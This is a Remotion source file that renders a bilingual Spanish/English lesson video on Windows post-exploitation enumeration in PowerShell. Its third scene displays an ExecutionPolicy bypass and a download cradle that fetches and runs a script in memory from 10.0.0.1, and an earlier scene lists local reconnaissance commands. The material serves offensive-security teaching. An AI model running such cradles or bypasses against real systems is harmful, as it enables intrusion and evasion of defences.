// ── video/remotion/compositions/Ps04WindowsEnumeration.tsx ───────
// Video: pentesting I — enumeración de Windows.
// Clase 4 de Scripting/PowerShell (lección powershell-04).
// Versión unificada ES/EN con `lang` prop.

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, audioTimings, audioBase, hasAudio } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { KeyCapsule } from '../primitives/KeyCapsule';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = { display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', height: '100%', textAlign: 'center' };
const VID = 'ps-04-windows-enumeration';

const COPY = {
  es: {
    s1: {
      title: <>ENUMERACIÓN: <span style={{ color: THEME.red }}>TU NAVAJA SUIZA</span></>,
      subtitle: 'El primer paso de la post-explotación en entornos Windows',
      capsuleLabel: 'primer paso', capsuleValue: 'saber dónde estás parado',
      points: ['Procesos, servicios, usuarios y permisos del sistema', 'Todo lo que en Linux enumeras con comandos, acá se hace con cmdlets'],
    },
    s2: {
      title: <>PRIVILEGIOS Y <span style={{ color: THEME.green }}>RECONOCIMIENTO LOCAL</span></>,
      terminalTitle: 'PS C:\\> .\\enum_local.ps1',
      terminalContent: [
        { parts: [{ color: 'cyan', text: 'whoami /priv' }, { color: 'dim', text: '                        # SeDebugPrivilege es ORO (SYSTEM)' }] },
        '\n',
        { parts: [{ color: 'cyan', text: 'Get-Process' }, { color: 'text', text: '; ' }, { color: 'cyan', text: 'Get-Service' }, { color: 'dim', text: '              # lista procesos y servicios SYSTEM' }] },
        '\n',
        { parts: [{ color: 'cyan', text: 'Get-ChildItem C:\\Users -Recurse -Force' }, { color: 'dim', text: ' # caza de archivos y configs' }] },
        '\n',
        { parts: [{ color: 'cyan', text: 'net user' }, { color: 'text', text: '; ' }, { color: 'cyan', text: 'net localgroup Administrators' }, { color: 'dim', text: '  # cuentas y administradores' }] },
        '\n',
        { parts: [{ color: 'cyan', text: 'Get-ItemProperty HKLM:\\Software\\...' }, { color: 'dim', text: '    # lectura del registro' }] },
      ],
      capsule1: { label: 'whoami /priv', value: 'SeDebugPrivilege' },
      capsule2: { label: 'Get-Process / Service', value: 'servicios SYSTEM' },
      capsule3: { label: 'net localgroup', value: 'grupo Administrators' },
    },
    s3: {
      title: <>EJECUCIÓN: <span style={{ color: THEME.cyan }}>BYPASS Y DOWNLOAD CRADLE</span></>,
      terminalTitle: 'PS C:\\> powershell -ep bypass ...',
      terminalContent: [
        { color: 'dim', text: '# 1. Bypass por ejecución de script:' },
        '\n',
        { color: 'cyan', text: 'powershell -ep bypass -File .\\enum.ps1' },
        '\n\n',
        { color: 'dim', text: '# 2. Download Cradle: descarga y corre en memoria (RAM) sin tocar disco' },
        '\n',
        { color: 'green', text: "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/recon.ps1')" },
        '\n',
        { color: 'amber', text: '[*] El patrón estándar de casi todo payload de PowerShell' },
      ],
      capsule1: { label: '-ep bypass', value: 'saltea ExecutionPolicy' },
      capsule2: { label: 'IEX DownloadString', value: 'download cradle' },
      capsule3: { label: 'en memoria (RAM)', value: 'sin tocar disco' },
    },
  },
  en: {
    s1: {
      title: <>ENUMERATION: <span style={{ color: THEME.red }}>YOUR SWISS ARMY KNIFE</span></>,
      subtitle: 'the first step of post-exploitation on Windows',
      capsuleLabel: 'first step', capsuleValue: "know where you're standing",
      points: ['processes, services, users, permissions — enumerate them all', "everything you enumerate with commands on Linux, here it's done with cmdlets"],
    },
    s2: {
      title: <>PRIVILEGES AND <span style={{ color: THEME.green }}>LOCAL RECON</span></>,
      terminalTitle: 'PS C:\\> .\\enum_local.ps1',
      terminalContent: [
        { parts: [{ color: 'cyan', text: 'whoami /priv' }, { color: 'dim', text: '                        # SeDebugPrivilege is GOLD' }] },
        '\n',
        { parts: [{ color: 'cyan', text: 'Get-Process' }, { color: 'text', text: '; ' }, { color: 'cyan', text: 'Get-Service' }, { color: 'dim', text: '              # processes and services (some run as SYSTEM)' }] },
        '\n',
        { parts: [{ color: 'cyan', text: 'Get-ChildItem C:\\Users -Recurse -Force' }, { color: 'dim', text: ' # hunts files in the Users folder' }] },
        '\n',
        { parts: [{ color: 'cyan', text: 'net user' }, { color: 'text', text: '; ' }, { color: 'cyan', text: 'net localgroup Administrators' }, { color: 'dim', text: '  # accounts and admins' }] },
        '\n',
        { parts: [{ color: 'cyan', text: 'Get-ItemProperty HKLM:\\Software\\...' }, { color: 'dim', text: '    # reads the registry' }] },
      ],
      capsule1: { label: 'whoami /priv', value: 'SeDebugPrivilege' },
      capsule2: { label: 'Get-Process / Service', value: 'SYSTEM services' },
      capsule3: { label: 'net localgroup', value: 'Administrators group' },
    },
    s3: {
      title: <>EXECUTION: <span style={{ color: THEME.cyan }}>BYPASS AND DOWNLOAD CRADLE</span></>,
      terminalTitle: 'PS C:\\> powershell -ep bypass ...',
      terminalContent: [
        { color: 'dim', text: '# 1. Bypass for a script run:' },
        '\n',
        { color: 'cyan', text: 'powershell -ep bypass -File .\\enum.ps1' },
        '\n\n',
        { color: 'dim', text: '# 2. Download Cradle: downloads and runs in memory, no disk' },
        '\n',
        { color: 'green', text: "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/recon.ps1')" },
        '\n',
        { color: 'amber', text: '[*] The pattern behind almost every PowerShell payload' },
      ],
      capsule1: { label: '-ep bypass', value: 'skips ExecutionPolicy' },
      capsule2: { label: 'IEX DownloadString', value: 'download cradle' },
      capsule3: { label: 'in memory', value: 'without touching disk' },
    },
  },
};

const BEATS = {
  es: { s1: { capsuleDelay: 2.5, points: [5, 9] }, s2: { terminalDelay: 1.5, capsule1Delay: 3.5, capsule2Delay: 8, capsule3Delay: 13 }, s3: { terminalDelay: 1.5, capsule1Delay: 3.5, capsule2Delay: 8, capsule3Delay: 13 } },
  en: { s1: { capsuleDelay: 12.2, points: [4.5, 10.5] }, s2: { terminalDelay: 0.5, capsule1Delay: 3.5, capsule2Delay: 10.3, capsule3Delay: 16.7 }, s3: { terminalDelay: 2.7, capsule1Delay: 4.4, capsule2Delay: 10.7, capsule3Delay: 17.6 } },
};

const renderTerminal = (lines: any[]) => lines.map((line, i) => {
  if (typeof line === 'string') return <React.Fragment key={i}>{line}</React.Fragment>;
  return (
    <React.Fragment key={i}>
      {i > 0 && line !== '\n' && '\n'}
      {line === '\n' ? '\n' : 'parts' in line
        ? line.parts.map((p: any, j: number) => <span key={j} style={{ color: THEME[p.color as keyof typeof THEME] }}>{p.text}</span>)
        : <span style={{ color: THEME[line.color as keyof typeof THEME] }}>{line.text}</span>}
    </React.Fragment>
  );
});

const Scene1: React.FC<{ fps: number; c: typeof COPY.es.s1; b: typeof BEATS.es.s1 }> = ({ fps, c, b }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 32, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 18 }}>{c.title}</div>
    <div style={{ fontSize: 18, color: THEME.muted, fontFamily: MONO, marginBottom: 28 }}>{c.subtitle}</div>
    <KeyCapsule label={c.capsuleLabel} value={c.capsuleValue} accent={THEME.cyan} delay={Math.round(b.capsuleDelay * fps)} size={24} />
    <div style={{ marginTop: 24, fontSize: 17, color: THEME.muted, fontFamily: MONO, textAlign: 'left', width: 780 }}>
      {c.points.map((p, i) => (<React.Fragment key={i}>{i > 0 && <div style={{ height: 10 }} />}<RevealLine at={b.points[i]} fps={fps} mark="▸" color={i === 0 ? THEME.cyan : THEME.green}>{p}</RevealLine></React.Fragment>))}
    </div>
  </AbsoluteFill>
);

const Scene2: React.FC<{ fps: number; c: typeof COPY.es.s2; b: typeof BEATS.es.s2 }> = ({ fps, c, b }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>{c.title}</div>
    <TerminalWindow title={c.terminalTitle} width={940} delay={Math.round(b.terminalDelay * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>{renderTerminal(c.terminalContent)}</div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 10, marginTop: 18, flexWrap: 'wrap', justifyContent: 'center' }}>
      <KeyCapsule label={c.capsule1.label} value={c.capsule1.value} accent={THEME.red} delay={Math.round(b.capsule1Delay * fps)} size={16} />
      <KeyCapsule label={c.capsule2.label} value={c.capsule2.value} accent={THEME.amber} delay={Math.round(b.capsule2Delay * fps)} size={16} />
      <KeyCapsule label={c.capsule3.label} value={c.capsule3.value} accent={THEME.cyan} delay={Math.round(b.capsule3Delay * fps)} size={16} />
    </div>
  </AbsoluteFill>
);

const Scene3: React.FC<{ fps: number; c: typeof COPY.es.s3; b: typeof BEATS.es.s3 }> = ({ fps, c, b }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>{c.title}</div>
    <TerminalWindow title={c.terminalTitle} width={940} delay={Math.round(b.terminalDelay * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>{renderTerminal(c.terminalContent)}</div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 12, marginTop: 18 }}>
      <KeyCapsule label={c.capsule1.label} value={c.capsule1.value} accent={THEME.amber} delay={Math.round(b.capsule1Delay * fps)} size={16} />
      <KeyCapsule label={c.capsule2.label} value={c.capsule2.value} accent={THEME.green} delay={Math.round(b.capsule2Delay * fps)} size={16} />
      <KeyCapsule label={c.capsule3.label} value={c.capsule3.value} accent={THEME.cyan} delay={Math.round(b.capsule3Delay * fps)} size={16} />
    </div>
  </AbsoluteFill>
);

export const Ps04WindowsEnumeration: React.FC<{ lang?: 'es' | 'en' }> = ({ lang = 'es' }) => {
  const { fps } = useVideoConfig();
  const c = COPY[lang]; const b = BEATS[lang];
  const [s1, s2, s3] = audioTimings(VID, lang);
  const starts = sceneStartFrames(VID, fps, lang);
  const dur1 = Math.ceil(s1 * fps); const dur2 = Math.ceil(s2 * fps); const dur3 = Math.ceil(s3 * fps) + fps;
  const base = audioBase(lang);
  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>{hasAudio(VID) && <Audio src={staticFile(`${base}/${VID}/ps-04-scene1.wav`)} />}<Scene1 fps={fps} c={c.s1} b={b.s1} /></Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>{hasAudio(VID) && <Audio src={staticFile(`${base}/${VID}/ps-04-scene2.wav`)} />}<Scene2 fps={fps} c={c.s2} b={b.s2} /></Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>{hasAudio(VID) && <Audio src={staticFile(`${base}/${VID}/ps-04-scene3.wav`)} />}<Scene3 fps={fps} c={c.s3} b={b.s3} /></Sequence>
    </AbsoluteFill>
  );
};
